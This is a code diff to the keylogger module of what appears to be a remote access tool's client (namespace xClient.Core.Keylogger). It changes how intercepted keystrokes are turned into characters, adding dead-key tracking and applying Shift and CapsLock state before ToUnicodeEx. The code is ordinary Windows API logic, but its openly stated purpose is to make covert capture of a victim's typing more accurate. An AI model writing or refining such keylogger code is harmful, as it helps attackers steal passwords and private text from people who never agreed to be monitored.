@@ -31,6 +31,10 @@ namespace xClient.Core.Keylogger.WinApi
         public const byte VK_MENU = 0x12;
         public const byte VK_PACKET = 0xE7;
         //Used to pass Unicode characters as if they were keystrokes. The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods
+        private static int lastVirtualKeyCode = 0;
+        private static int lastScanCode = 0;
+        private static byte[] lastKeyState = new byte[255];
+        private static bool lastIsDead = false;
 
         /// <summary>
         ///     Translates a virtual key to its character equivalent using the current keyboard layout without knowing the
@@ -75,23 +79,30 @@ namespace xClient.Core.Keylogger.WinApi
             StringBuilder pwszBuff = new StringBuilder(64);
             KeyboardState keyboardState = KeyboardState.GetCurrent();
             byte[] currentKeyboardState = keyboardState.GetNativeState();
+            bool isDead = false;
+
+            if (keyboardState.IsDown(Keys.ShiftKey))
+                currentKeyboardState[(byte) Keys.ShiftKey] = 0x80;
+
+            if (keyboardState.IsToggled(Keys.CapsLock))
+                currentKeyboardState[(byte) Keys.CapsLock] = 0x01;
 
             var relevantChars = ToUnicodeEx(virtualKeyCode, scanCode, currentKeyboardState, pwszBuff, pwszBuff.Capacity, fuState, dwhkl);
-
 
             switch (relevantChars)
             {
                 case -1:
+                    isDead = true;
                     ClearKeyboardBuffer(virtualKeyCode, scanCode, dwhkl);
                     chars = null;
-                    return false;
+                    break;
 
                 case 0:
                     chars = null;
-                    return false;
+                    break;
 
                 case 1:
-                    chars = new[] {pwszBuff[0]};
+                    chars = new[] { pwszBuff[0] };
                     break;
 
                 // Two or more (only two of them is relevant)
@@ -100,20 +111,19 @@ namespace xClient.Core.Keylogger.WinApi
                     break;
             }
 
-
-
-            var isDownShift = keyboardState.IsDown(Keys.ShiftKey);
-            var isToggledCapsLock = keyboardState.IsToggled(Keys.CapsLock);
-
-            for (int i = 0; i < chars.Length; i++)
+            if (lastVirtualKeyCode != 0 && lastIsDead)
             {
-                var ch = chars[i];
-                if ((isToggledCapsLock ^ isDownShift) && Char.IsLetter(ch))
-                {
-                    chars[i] = Char.ToUpper(ch);
-                }
+                StringBuilder sbTemp = new StringBuilder(5);
+                ToUnicodeEx(lastVirtualKeyCode, lastScanCode, lastKeyState, sbTemp, sbTemp.Capacity, 0, dwhkl);
+                lastVirtualKeyCode = 0;
+
+                return true;
             }
 
+            lastScanCode = scanCode;
+            lastVirtualKeyCode = virtualKeyCode;
+            lastIsDead = isDead;
+            lastKeyState = (byte[]) currentKeyboardState.Clone();
 
             return true;
         }
